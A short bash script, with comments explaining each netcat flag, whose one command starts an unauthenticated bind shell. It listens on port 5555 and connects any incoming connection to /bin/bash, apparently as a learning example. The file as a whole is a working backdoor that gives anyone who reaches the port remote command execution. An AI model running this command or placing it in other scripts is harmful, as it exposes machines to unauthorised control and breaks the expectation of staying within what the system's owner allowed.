#!/bin/bash
#starts netcat, indicates -n (no DNS lookup on specified addresses, hostnames, ports), -v (verbose output) -l (listen, don't initiate connection), -p (port to listen on), -e (program to execute after connection
#occurs, connect STDIN and STDOUT to that program (bash shell in this case)
nc -n -v -l -p 5555 -e /bin/bash

